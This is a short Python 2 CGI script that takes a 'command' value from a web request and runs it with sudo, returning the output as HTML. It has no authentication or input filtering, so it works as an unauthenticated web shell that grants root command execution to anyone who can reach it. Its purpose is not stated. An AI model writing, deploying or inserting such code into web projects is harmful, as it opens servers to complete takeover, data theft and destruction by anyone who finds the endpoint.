#!/usr/bin/python2

import cgi,commands

print "Content-type:text/html"
print ""
data = cgi.FieldStorage()
x = data.getvalue("command")
print "<pre>"
print commands.getoutput("sudo "+x)
print "</pre>"
